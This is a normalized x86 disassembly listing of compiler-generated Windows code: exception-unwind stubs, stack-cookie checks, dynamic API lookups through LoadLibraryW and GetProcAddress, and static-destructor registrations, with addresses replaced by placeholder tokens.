lea esi [ ebp - 0x330 ]
jmp sub_411980
sub_45443d
lea esi [ ebp - 0x3c0 ]
jmp sub_4218d0
sub_454448
lea esi [ ebp - 0x3a4 ]
jmp sub_4218d0
sub_454453
lea esi [ ebp - 0x3c0 ]
jmp sub_411980
sub_45445e
lea esi [ ebp - 0x450 ]
jmp sub_4218d0
sub_454469
lea esi [ ebp - 0x434 ]
jmp sub_4218d0
sub_454474
lea esi [ ebp - 0x450 ]
jmp sub_411980
sub_45447f
lea esi [ ebp - 0x258 ]
jmp sub_4218d0
sub_45448a
lea esi [ ebp - 0x23c ]
jmp sub_4218d0
sub_454495
lea esi [ ebp - 0x258 ]
jmp sub_411980
sub_4544a0
lea esi [ ebp - 0xa8 ]
jmp sub_4218d0
sub_4544ab
lea esi [ ebp - 0x8c ]
jmp sub_4218d0
sub_4544b6
lea esi [ ebp - 0xa8 ]
jmp sub_411980
sub_4544c1
lea esi [ ebp - 0x2e8 ]
jmp sub_4218d0
sub_4544cc
lea esi [ ebp - 0x2cc ]
jmp sub_4218d0
sub_4544d7
lea esi [ ebp - 0x2e8 ]
jmp sub_411980
sub_4544e2
lea esi [ ebp - 0x1c8 ]
jmp sub_4218d0
sub_4544ed
lea esi [ ebp - 0x1ac ]
jmp sub_4218d0
sub_4544f8
lea esi [ ebp - 0x1c8 ]
jmp sub_411980
sub_454503
lea esi [ ebp - 0x378 ]
jmp sub_4218d0
sub_45450e
lea esi [ ebp - 0x35c ]
jmp sub_4218d0
sub_454519
lea esi [ ebp - 0x378 ]
jmp sub_411980
sub_454524
lea esi [ ebp - 0x138 ]
jmp sub_4218d0
sub_45452f
lea esi [ ebp - 0x11c ]
jmp sub_4218d0
sub_45453a
lea esi [ ebp - 0x138 ]
jmp sub_411980
sub_454545
lea esi [ ebp - 0x408 ]
jmp sub_4218d0
sub_454550
lea esi [ ebp - 0x3ec ]
jmp sub_4218d0
sub_45455b
lea esi [ ebp - 0x408 ]
jmp sub_411980
sub_454566
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x454 ]
mov ecx [ edx - 0x458 ]
xor ecx eax
call sub_437c1c
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4545a0
mov esi [ ebp + 0x8 ]
add esi 0x4
jmp sub_412fb0
sub_4545ab
lea ecx [ ebp - 0x14 ]
jmp sub_402840
sub_4545b3
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x1c ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_4545d0
mov eax [ ebp - 0x10 ]
push eax
call sub_43811c
pop ecx
retn
sub_4545db
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_437c1c
mov eax r--data
jmp sub_43c978
sub_454600
push r--data
call [ LoadLibraryW@IAT ]
mov [ rw-data ] eax
retn
sub_454620
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_454640
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_454660
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_454680
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_4546a0
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_4546c0
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_4546e0
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_454700
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_454720
mov eax [ rw-data ]
push r--data
push eax
call [ GetProcAddress@IAT ]
mov [ rw-data ] eax
retn
sub_4547b0
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
test eax eax
setne al
mov [ rw-data ] al
retn
sub_4547d2
push sub_454914
call sub_43ceb4
pop ecx
retn
sub_4547de
push sub_45491f
call sub_43ceb4
pop ecx
retn
sub_4547ea
push sub_45492a
call sub_43ceb4
pop ecx
retn
sub_4547f6
push sub_45493f
call sub_43ceb4
pop ecx
retn
sub_454802
push sub_454935
call sub_43ceb4
pop ecx
retn
sub_45480e
mov ecx rw-data
call sub_43612e
push sub_454949
call sub_43ceb4
pop ecx
retn
sub_454824
mov ecx rw-data
call sub_43612e
push sub_454953
call sub_43ceb4
pop ecx
retn
sub_45483a
call sub_438fc8
add eax 0x20
push eax
mov ecx rw-data
call sub_4367aa
push sub_454967
call sub_43ceb4
pop ecx
retn
sub_454859
push 0x1
push 0x0
push rw-data
mov ecx rw-data
call sub_40fa40
push sub_45495d
call sub_43ceb4
pop ecx
retn
sub_454878
mov ecx rw-data
jmp sub_436732
sub_454882
mov ecx rw-data
call sub_43612e
push sub_454971
call sub_43ceb4
pop ecx
retn
sub_454898
call sub_438fc8
push eax
mov ecx rw-data
call sub_4367aa
push sub_454985
call sub_43ceb4
pop ecx
retn
sub_4548b4
push 0x1
push 0x0
push rw-data
mov ecx rw-data
call sub_4046f0
push sub_45497b
call sub_43ceb4
pop ecx
retn
sub_4548d3
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov [ rw-data ] rw-data
mov eax [ eax + 0x4 ]
mov [ eax + rw-data ] ecx
retn
sub_4548f2
mov ecx rw-data
call sub_43612e
push sub_45498f
call sub_43ceb4
pop ecx
retn
sub_454908
push sub_454999
call sub_43ceb4
pop ecx
retn
sub_454914
mov [ rw-data ] r--data
retn
sub_45491f
mov [ rw-data ] r--data
retn
sub_45492a
mov [ rw-data ] r--data
retn
sub_454935
mov ecx rw-data
jmp sub_402840
sub_45493f
mov ecx rw-data
jmp sub_435eee
sub_454949
mov ecx rw-data
jmp sub_43615f
sub_454953
mov ecx rw-data
jmp sub_43615f
sub_45495d
mov ecx rw-data
jmp sub_404370
sub_454967
mov ecx rw-data
jmp sub_437438
sub_454971
mov ecx rw-data
jmp sub_43615f
sub_45497b
mov ecx rw-data
jmp sub_404390
sub_454985
mov ecx rw-data
jmp sub_437438
sub_45498f
mov ecx rw-data
jmp sub_43615f
sub_454999
mov ecx rw-data
jmp sub_437bb1
sub_4549a3
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_437d2d
